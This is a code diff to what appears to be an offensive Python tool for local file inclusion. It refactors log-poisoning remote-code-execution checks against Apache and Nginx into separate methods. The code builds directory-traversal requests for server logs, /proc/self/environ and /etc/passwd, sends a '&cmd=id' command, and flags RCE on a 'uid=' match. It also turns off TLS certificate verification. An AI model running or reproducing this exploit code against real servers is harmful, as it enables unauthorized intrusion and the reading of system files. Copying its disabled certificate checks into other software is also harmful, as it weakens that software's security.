@@ -18,6 +18,7 @@ import base64
 class Payload:
 
 	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False):
+		requests.packages.urllib3.disable_warnings() # Comment out to stop suppressing warnings.
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
@@ -159,11 +160,11 @@ class Payload:
 		try:
 			print("Checking Remote Server Health")
 			if self.proxies:
-				ret = requests.get(self.url, headers=fetchUA(), proxies=fetch_proxy())
+				ret = requests.get(self.url, headers=fetchUA(), proxies=fetch_proxy(), verify=False)
 			elif self.creds is not None:
 				ret = self.cred(self.url)
 			else:
-				ret = requests.get(self.url, headers=fetchUA())
+				ret = requests.get(self.url, headers=fetchUA(), verify=False)
 			if ret.status_code == 200:
 				print(colored(str(ret.status_code) +" - OK",'green'))
 				return True
@@ -310,53 +311,77 @@ class Payload:
 		response = requests.get(self.url, headers=headers)
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
+
+		# Check to see if the server leaks a Server Header.
+		if not 'Server' in response.headers.keys():
+			print(colored('[-]', 'red') + " Server does not leak the Server Header. It's impossible to tell if it's running nginx or apache.")
+			print(colored('[?]', 'yellow') + " Hit every known server type? [y/N]: ", end='')
+			ans = str(input())
+			print(ans)
+			if 'y' in ans.lower():
+				# Attempt to hit apache files first
+				ret = self.hitApache()	
+				# If we get a hit then return that. (No need to hit Nginx files)
+				if ret:
+					return ret
+				# Otherwise hit Nginx Files and return the results no matter what they are
+				return self.hitNginx()
+			else:
+				return False
+
 		# checks the type of the server
 		if "apache" in response.headers['Server'].lower():
-			if self.verbosity > 1:
-				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
-			# Apache logs
-			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/apache/access.log"), quote("/var/log/apache2/error.log"), quote("/var/log/apache/error.log"), quote("/usr/local/apache/log/error_log"), quote("/usr/local/apache2/log/error_log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
-			rce = []
-			for d_path in self.linux_dirTraversal:
-				for l_path in logPath:
-					pathth = self.url + d_path + l_path
-					compUrl = pathth + "&cmd=id"
-					clean = self.hit(compUrl)
-					if "uid=" in clean.lower():
-						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
-						if self.outfile is not None:
-							self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathth + '\n')
-						rce.append(pathth)
-					else:
-						if self.verbosity > 0:
-							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		
-			if len(rce) == 0:
-				return False
-			return rce
+			return self.hitApache()			
 
 		elif "nginx" in response.headers['Server'].lower():
-			# Nginx logs
-			if self.verbosity > 1:
-				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
-			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
-			rce = []
-			for d_path in self.linux_dirTraversal:
-				for l_path in log:
-					pathh = self.url + d_path + l_path
-					compUrl = pathh + "&cmd=id"
-					clean = self.hit(compUrl)
-					if "uid=" in clean.lower():
-						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
-						if self.outfile is not None:
-							self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
-						rce.append(pathh)
-					else:
-						if self.verbosity > 0:
-							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
-			if len(rce) == 0: 
-				return False
-			return rce
+			return self.hitNginx()
 		else:
 			print(colored('[-]', 'red', attrs=['bold']) + " The server type " + response.headers['Server'] + " is not supported!!!")
 		return False
 
+
+	def hitApache(self):
+		if self.verbosity > 1:
+			print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
+		# Apache logs
+		logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/apache/access.log"), quote("/var/log/apache2/error.log"), quote("/var/log/apache/error.log"), quote("/usr/local/apache/log/error_log"), quote("/usr/local/apache2/log/error_log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
+		rce = []
+		for d_path in self.linux_dirTraversal:
+			for l_path in logPath:
+				pathth = self.url + d_path + l_path
+				compUrl = pathth + "&cmd=id"
+				clean = self.hit(compUrl)
+				if "uid=" in clean.lower():
+					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
+					if self.outfile is not None:
+						self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathth + '\n')
+					rce.append(pathth)
+				else:
+					if self.verbosity > 0:
+						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		
+		if len(rce) == 0:
+			return False
+		return rce
+
+	def hitNginx(self):
+		# Nginx logs
+		if self.verbosity > 1:
+			print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
+		log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
+		rce = []
+		for d_path in self.linux_dirTraversal:
+			for l_path in log:
+				pathh = self.url + d_path + l_path
+				compUrl = pathh + "&cmd=id"
+				clean = self.hit(compUrl)
+				if "uid=" in clean.lower():
+					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
+					if self.outfile is not None:
+						self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
+					rce.append(pathh)
+				else:
+					if self.verbosity > 0:
+						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
+		if len(rce) == 0: 
+			return False
+		return rce
